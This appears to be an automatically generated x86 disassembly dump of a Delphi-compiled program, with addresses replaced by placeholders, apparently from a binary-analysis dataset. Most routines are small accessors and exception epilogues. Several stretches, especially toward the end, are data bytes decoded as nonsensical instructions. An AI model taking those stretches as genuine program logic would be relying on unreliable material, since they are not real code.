sub edx 0x201
jne r-xdata
pop ebx
retn
mov al 0x1
sub_46e1e4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_47efd8
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_46e204
push ebx
mov ebx eax
mov eax ebx
call sub_44ab7c
mov dl [ ebx + 0x57 ]
mov eax [ ebx + 0x1a8 ]
call sub_448ecc
pop ebx
retn
sub_46e3d0
call sub_44a260
retn
sub_46e5bc
mov eax [ r-xdata ]
retn
sub_46e5c4
xor edx edx
mov ecx [ eax + 0x288 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
call sub_42bc74
mov edx eax
sub_46e601
jmp sub_4038bc
sub_46e608
pop ebp
retn
sub_46e60c
sub [ rw-data ] 0x1
retn
sub_46e87a
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0xf8
rol [ edi ] 0x2c
add al [ edi ]
movsb [ edi ] [ esi ]
retn 0x47
sub_46ee9e
inc edi
add al bh
les eax [ edi ]
int3
sub_46f202
inc edi
add [ eax - 0x33ffb8ba ] bl

sub_46f948
mov ecx [ eax ]
call [ ecx ]
retn
sub_46fb19
mov eax [ ebx + 0xa0 ]
call sub_465de4
pop ebx
retn
sub_46fb60
mov al 0x1
retn
sub_46fb64
mov dl 0x1
call sub_455d30
retn
sub_46fc14
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41889c
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax rw-data
call sub_40d31c
sub_4700b0
push ebx
mov ebx eax
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
cmp [ eax + 0x296 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4701ec
mov edx [ eax ]
call [ edx + 0x180 ]
retn
sub_4704b8
jmp sub_4038bc
sub_470863
jmp sub_4038bc
sub_47086a
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_470a98
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_470b76
jmp sub_4038bc
sub_471366
jmp sub_4038bc
sub_4714ab
jmp sub_4038bc
sub_4714b2
pop ebx
mov esp ebp
pop ebp
retn
sub_4716e0
push ebx
mov ebx eax
mov eax ebx
call sub_448e80
mov eax ebx
call sub_4607d8
mov [ ebx + 0x2a4 ] eax
pop ebx
retn
sub_47180c
jmp sub_4038bc
sub_471818
mov ecx [ edx ]
sub ecx 0x84
jne r-xdata
call sub_44d1ec
retn
mov [ edx + 0xc ] 0x1
sub_471b27
jmp sub_4038bc
sub_471b2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471cf1
jmp sub_4038bc
sub_471cf8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403608#5
jmp sub_403608
sub_472026
jmp sub_4038bc
sub_47202d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4720a0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_472034
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_4720b8
mov edx [ eax + 0x2c4 ]
test edx edx
je r-xdata
call sub_47eb34
retn
cmp edx eax
je r-xdata
mov eax edx
mov edx [ eax ]
call [ edx + 0x148 ]
retn
sub_472104
push ebx
mov ebx eax
lea eax [ ebx + 0x2f8 ]
call sub_40d31c
mov eax ebx
call sub_47e144
pop ebx
retn
sub_4721d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebp
retn 0xc
sub_4726c4
mov al 0x1
retn
sub_4726c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4494d4
mov edx esi
mov eax ebx
call sub_4705d0
pop esi
pop ebx
retn
sub_472815
jmp sub_4038bc
sub_47281c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472d0c
mov ecx edx
add cl 0xfe
sub cl 0x2
jae r-xdata
retn
call sub_47d8ec
sub_473090
jmp sub_4038bc
sub_473097
pop ebx
mov esp ebp
pop ebp
retn
sub_47321c
mov eax [ r-xdata ]
retn
sub_4732bc
push ebx
mov ebx eax
mov eax [ ebx + 0x310 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4494d4
mov eax [ ebx + 0x308 ]
call sub_4494d4
sub_47334c
cmp dl [ eax + 0x314 ]
je r-xdata
retn
mov [ eax + 0x314 ] dl
call sub_44cd78
sub_473444
mov dl 0x1
call sub_448f08
retn
sub_473504
retn
sub_473508
mov edx [ eax ]
call [ edx + 0x17c ]
retn
sub_473a96
jmp sub_4038bc
sub_473a9d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473c88
push ebx
mov ebx eax
mov eax ebx
call sub_4700dc
mov eax ebx
call sub_470120
pop ebx
retn
sub_473df0
xor eax eax
retn
sub_473f6f
jmp sub_4038bc
sub_474064
cmp dl [ eax + 0x30d ]
je r-xdata
retn
mov [ eax + 0x30d ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_474145
jmp sub_4038bc
sub_47414c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4743d7
jmp sub_4038bc
sub_4743de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474670
push ebx
mov ebx eax
lea eax [ ebx + 0x314 ]
call sub_40d31c
lea eax [ ebx + 0x318 ]
call sub_40d31c
lea eax [ ebx + 0x31c ]
call sub_40d31c
pop ebx
retn
sub_47483c
cmp [ edx + 0x4 ] 0x12
sete cl
mov [ eax + 0x28a ] cl
call sub_471b60
retn
sub_474850
cmp [ edx + 0x4 ] 0x12
sete cl
mov [ eax + 0x28a ] cl
call sub_44e79c
retn
sub_474901
jmp sub_4038bc
sub_474908
pop ecx
pop ebp
retn
sub_474c14
mov eax [ eax + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2a4 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_474e08
jmp sub_4038bc
sub_474e0f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_474eae
jmp sub_4038bc
sub_474eb5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4751fc
retn
sub_475302
jmp sub_4038bc
sub_475309
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4753e7
jmp sub_4038bc
sub_4753ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4755f4
jmp sub_4038bc
sub_47563b
jmp sub_4038bc
sub_47577c
push ebx
push esi
mov ebx eax
mov [ ebx + 0x1b1 ] 0x1
mov eax ebx
mov si 0xffeb
call sub_403324
mov eax ebx
call sub_47ec40
pop esi
pop ebx
retn
sub_475b06
jmp sub_4038bc
sub_475b0d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_475b30
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax ebx
call sub_4800a4
pop ebx
retn
sub_475c80
retn
sub_475d0c
jmp sub_4038bc
sub_475d13
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475d79
jmp sub_4038bc
sub_475d80
pop ebp
retn
sub_475d84
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_4774ea
inc edi
add al bh
les eax [ edi ]
int3
sub_4774f2
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0xf8
rol [ edi ] 0xa4
rol [ edi ] 0xa4
retn 0x47
sub_4775b6
inc edi
add [ edi + ebx * 8 ] bh
inc edi
add [ edx + 0x47 ] cl
add [ eax ] al
jmp sub_47760a
sub_4775c3
add ah ah
int3
sub_47774e
0x1cffdeff 0xeb0
sub_477755
mov al 0x2
mov ah 0x11
mov ah 0xdc
dec [ eax + eax ]
jmp r-xdata
dec ebx
jmp [ eax ]
sub_477763
push es
dec eax
add al bl
add [ eax ] cl
int3
sub_477963
[ eax + 0x30000000 ]
sub_477c77
jmp sub_4038bc
sub_477fd4
jmp sub_403608
sub_478046
jmp sub_4038bc
sub_47804d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47806f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
sub_478068
jmp sub_4038bc
sub_47806f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403608#4
jmp sub_403608
sub_478163
jmp sub_4038bc
sub_47816a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478385
jmp sub_4038bc
j_sub_403608#3
jmp sub_403608
sub_4784d2
jmp sub_4038bc
j_sub_403608#2
jmp sub_403608
sub_47851d
jmp sub_4038bc
sub_478524
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478592
jmp sub_4038bc
sub_478599
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47862c
push esi
mov esi eax
mov eax [ esi + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_478740
jmp sub_4038bc
sub_478747
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4788af
jmp sub_4038bc
sub_4788b6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478977
jmp sub_4038bc
sub_47897e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4789d6
jmp sub_4038bc
sub_4789dd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_478bb0
push ebx
mov ebx eax
mov eax [ ebx + 0x6c ]
call sub_419538
test eax eax
setg al
pop ebx
retn
j_sub_403608
jmp sub_403608
sub_478cc5
jmp sub_4038bc
sub_478ccc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478d38
jmp sub_4038bc
sub_478d3f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478eec
jmp sub_4038bc
sub_478f09
jmp sub_4038bc
sub_478f10
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_479000
jmp sub_4038bc
sub_479007
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479010
push ebx
mov ebx eax
mov eax ebx
call sub_419848
pop ebx
retn
sub_47901c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419540
pop esi
pop ebx
retn
sub_479232
jmp sub_4038bc
sub_479239
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4796bf
jmp sub_4038bc
sub_47974e
jmp sub_4038bc
sub_479755
mov al [ ebp - 0x1d ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47976f
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6405173d ]
clc
inc esi
inc ebx
and al 0x1
pop ebx
retn
sub_4798e4
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
mov dl 0x1
call sub_479270
sub_479adb
jmp sub_4038bc
sub_479af4
xor edx edx
mov [ eax + 0xc ] edx
retn
sub_479afc
retn
sub_479df8
retn
sub_479edf
jmp sub_4038bc
sub_479ee6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_479eec
test edx edx
jne r-xdata
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
add eax 0x2c
call sub_40d31c
retn
sub_47a01c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x31 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x31 ] al
sub_47a034
push esi
mov esi eax
cmp edx [ esi + 0x24 ]
je r-xdata
pop esi
retn
mov [ esi + 0x24 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
sub_47a048
mov [ eax + 0x1c ] edx
retn
sub_47a04c
cmp dl [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] dl
xor eax eax
call sub_477b70
sub_47a101
add [ eax ] al
add [ esi - 0x75 ] dl
jo r-xdata
mov si 0xffd0
call sub_403324
test esi esi
je r-xdata
pop esi
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax esi
sub_47a120
push esi
mov esi eax
cmp dl [ esi + 0x38 ]
je r-xdata
pop esi
retn
mov [ esi + 0x38 ] dl
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0xcc ]
sub_47a1ef
jmp sub_4038bc
sub_47a248
push ebx
mov ebx eax
mov eax ebx
call sub_47a04c
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
pop ebx
retn
mov dl [ ebx + 0x30 ]
call sub_448ecc
sub_47a2bc
push ebx
mov ebx eax
mov eax ebx
call sub_419398
pop ebx
retn
sub_47a300
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419540
pop esi
pop ebx
retn
sub_47a314
xor eax eax
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov al [ eax + 0x7c ]
sub_47a370
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
push eax
push sub_47a2c8
mov edx eax
call sub_4797c0
sub_47a388
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0x7c ] dl
sub_47a3f0
push ebx
mov ebx eax
mov eax ebx
call sub_419398
pop ebx
retn
sub_47a6df
jmp sub_4038bc
sub_47a7a6
jmp sub_4038bc
sub_47a884
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_47a96d
jmp sub_4038bc
sub_47a974
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47aa43
jmp sub_4038bc
sub_47aa4a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47aeeb
jmp sub_4038bc
sub_47aef2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b015
jmp sub_4038bc
sub_47b01c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b039
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_47b032
jmp sub_4038bc
sub_47b039
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b0a0
mov eax [ r-xdata ]
retn
sub_47b1c9
jmp sub_4038bc
sub_47b1d0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b274
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_47b2fa
jmp sub_4038bc
sub_47b301
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47b308
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47b6ed
jmp sub_4038bc
sub_47b6f4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47bb88
test eax eax
je r-xdata
retn
mov ecx [ eax + 0x68 ]
mov ecx [ ecx + 0x18 ]
cmp ecx [ edx + 0x50 ]
je r-xdata
mov eax [ eax + 0x68 ]
mov edx [ edx + 0x50 ]
call sub_42426c
sub_47bc60
mov edx [ eax + 0x44 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax edx
retn
cmp [ eax + 0x44 ] 0x1fffffff
jne r-xdata
mov edx [ eax + 0x40 ]
sub_47bc78
mov edx [ eax + 0x60 ]
cmp edx 0x20000000
jne r-xdata
mov eax edx
retn
mov edx 0x13
mov eax [ eax + 0x40 ]
call sub_46b0f8
retn
sub_47bdc8
xor edx edx
mov [ eax + 0x70 ] edx
retn
sub_47bfe8
push ebx
mov [ eax + 0x24c ] 0x1
mov [ eax + 0x250 ] 0x1
xor ebx ebx
mov [ eax + 0x26c ] ebx
xor ebx ebx
mov [ eax + 0x268 ] ebx
call sub_44bed8
pop ebx
retn
sub_47c014
retn
sub_47c17c
jmp sub_4038bc
sub_47c292
jmp sub_4038bc
sub_47c3ac
jmp sub_4038bc
sub_47ccd1
jmp sub_4038bc
sub_47ccd8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47cdf0
jmp sub_4038bc
sub_47cdf7
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47cec0
jmp sub_4038bc
sub_47cec7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d548
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x118 ]
cmp [ ebx + 0x242 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_47d5eb
jmp sub_4038bc
sub_47d5f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d615
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425154
retn
sub_47d60e
jmp sub_4038bc
sub_47d615
pop ebx
pop ecx
pop ebp
retn
sub_47d972
jmp sub_4038bc
sub_47d980
cmp edx [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] edx
call sub_44c098
sub_47d9d0
cmp dl [ eax + 0x248 ]
je r-xdata
retn
mov [ eax + 0x248 ] dl
call sub_449520
sub_47ddbc
cmp [ eax + 0x224 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
xor eax eax
retn
mov al 0x1
cmp [ eax + 0x225 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
retn
sub_47dde0
push esi
mov esi eax
cmp edx [ esi + 0x258 ]
je r-xdata
pop esi
retn
mov [ esi + 0x258 ] edx
mov eax esi
call sub_44c098
mov eax esi
mov si 0xffee
call sub_403324
sub_47de08
push esi
mov esi eax
cmp edx [ esi + 0x254 ]
je r-xdata
pop esi
retn
mov [ esi + 0x254 ] edx
mov eax esi
call sub_44c098
mov eax esi
mov si 0xffee
call sub_403324
sub_47de30
mov edx [ eax ]
call [ edx + 0x120 ]
retn
sub_47deaf
jmp sub_4038bc
sub_47df2f
jmp sub_4038bc
sub_47df36
pop ebx
mov esp ebp
pop ebp
retn
sub_47e2fc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebx
retn
sub_47ea5b
jmp sub_4038bc
sub_47ea70
push esi
mov esi eax
mov eax esi
call sub_44ee78
mov eax esi
call sub_47ea90
mov edx [ eax ]
call [ edx + 0x38 ]
pop esi
retn
sub_47ea88
mov eax [ r-xdata ]
retn
sub_47eb34
mov edx [ eax + 0x214 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_480bb8
retn
cmp [ edx + 0xc8 ] 0x0
je r-xdata
mov eax [ edx + 0xc8 ]
retn
sub_47efb8
push esi
mov esi eax
mov eax esi
call sub_44abac
cmp [ esi + 0x16c ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47f570
jmp sub_4038bc
sub_47f577
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_47f58d
jmp sub_4038bc
sub_47f827
jmp sub_4038bc
sub_47f82e
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_47f900
jmp sub_4038bc
sub_47f907
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_47fcdf
jmp sub_4038bc
sub_47fce6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fcf0
push esi
mov si 0xffd0
call sub_403324
pop esi
retn
sub_47fefa
jmp sub_4038bc
sub_47ff01
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4800d0
mov [ edx + 0xc ] 0x1
retn
sub_48010c
mov eax [ eax + 0x160 ]
call sub_425028
retn
sub_480504
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x168 ]
test eax eax
je r-xdata
pop esi
retn
mov si 0xffcf
call sub_403324
sub_480524
xor edx edx
mov ecx [ eax + 0x16c ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x50 ]
sub_4805e0
mov edx [ eax + 0x16c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax edx
call sub_47b0a8
retn
sub_4805f8
push esi
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
sub_480714
jmp sub_4038bc
sub_48071b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480993
jmp sub_4038bc
sub_480ba0
cmp eax [ edx + 0x8 ]
je r-xdata
retn
cmp [ eax + 0x170 ] 0x0
je r-xdata
xor edx edx
call sub_480b54
sub_480c27
jmp sub_4038bc
sub_480c2e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_480c79
jmp sub_4038bc
sub_480c80
pop ebp
retn
sub_480cc3
jmp sub_4038bc
sub_480cca
pop ebp
retn
sub_4810b6
inc edi
add al bh
les eax [ edi ]
int3
sub_481756
inc edi
add al bh
les eax [ edi ]
int3
sub_482242
jmp sub_4038bc
sub_4823ec
jmp sub_4038bc
sub_4823f3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482463
jmp sub_4038bc
sub_48246a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_482535
jmp sub_4038bc
sub_48253c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_482544
retn
sub_48281d
jmp sub_4038bc
sub_482824
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_482928
mov eax [ r-xdata ]
retn
sub_482930
push ebx
mov ebx eax
mov eax ebx
call sub_4732bc
mov eax [ ebx + 0x318 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4494d4
j_sub_4038bc#9
jmp sub_4038bc
sub_482c9a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4831a0
jmp sub_4038bc
j_sub_4038bc#8
jmp sub_4038bc
sub_483289
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
j_sub_4038bc#7
jmp sub_4038bc
sub_4835c8
mov eax [ r-xdata ]
retn
sub_483610
mov eax [ r-xdata ]
retn
sub_483618
mov eax [ r-xdata ]
retn
j_sub_4038bc#6
jmp sub_4038bc
sub_4837a4
pop ebx
mov esp ebp
pop ebp
retn
sub_483d27
jmp sub_4038bc
sub_483fe7
jmp sub_4038bc
sub_483fee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4038bc#5
jmp sub_4038bc
sub_484103
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
j_sub_4038bc#4
jmp sub_4038bc
sub_4841f8
pop ebp
retn
sub_4841fc
sub [ rw-data ] 0x1
retn
sub_4842bc
mov eax [ r-xdata ]
retn
sub_4843d8
mov eax [ r-xdata ]
retn
sub_4843e0
push ebx
mov ebx edx
mov eax ebx
mov edx r-xdata
call sub_403f0c
pop ebx
retn
sub_484442
retn
j_sub_4038bc#3
jmp sub_4038bc
j_sub_484442
jmp sub_484442
sub_48444a
pop ebp
retn
j_sub_4038bc#2
jmp sub_4038bc
sub_4844ba
pop ecx
pop ebp
retn
sub_484b6b
cdq
sub [ edx + 0x52 ] 0x69
imul edi ecx 0x695aed66
imul ebp [ ecx + 0x3f ] 0x69563581
imul ebx [ edx - 0x61 ] 0xed66a9ec
dec ebx
imul ebp [ ecx + 0x69 ] 0x7dde663e
sbb ah ah
adc edx esi
0xee667096 0x696a
sub_484c30
cmp ch [ ecx + 0x69 ]
xchg esi eax
sub al 0x95
0x806a9514 0x714f
sub_486bb0
push ecx
cmp [ esi - 0x21 ] esp
sub dh [ edi - 0x80 ]
nop
pop edx
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
0x59804496 0x694d
sub_48720f
pop ds
cmp eax esp
sub al 0x9d
cmp al [ eax + 0x69696f79 ]
0x790365ad 0xc080
sub_487221
dec edi
imul ebp [ ecx - 0x7 ] 0x3ae92ce4
cmp [ eax - 0x69696316 ] eax
stc
in al dx
0x5a9696b3 0x80a9
sub_489d99
imul ebp [ ecx + 0x3 ] 0x6b033996
add [ ecx - 0x69dfa95b ] edx
fisubr [ ebp - 0x7e969697 ]
dec esp
adc [ esi + 0x7dadea96 ] 0x1
popfd
push 0x3e966969
popad
xor dl 0x83
xchg esi eax
xchg esi eax
0xeb666a96 0xaa6b
sub_48a434
0x790365ad 0x8b80
sub_48a48a
retn
sub_48a48b
mov bl 0x96
xchg esi eax
in al 0x2e
push 0x96902b80
xchg esi eax
in al dx
test eax 0x6971ed66
imul ebp [ ecx + 0x3 ] 0xc5ff9669
imul ebp [ ecx + 0x69 ] 0x6969aa01
imul eax [ ebx ] 0xf1813f69
retn
sub_48a4b1
xchg esi eax
xchg esi eax
0x125065ad 0x6655
sub_48a538
test [ esi + 0x6124e296 ] dl
inc edx
mov eax [ 0x249679e3 ]
add [ gs : ebx ] 0xbe
xchg esi eax
xchg esi eax
stc
stc
0x2ce451ad 0x80b9
sub_48a553
retn 0x96b4
j_sub_4038bc
jmp sub_4038bc
sub_48a644
pop ebp
retn
sub_48a807
jmp sub_4038bc
sub_48a80e
pop ebp
retn
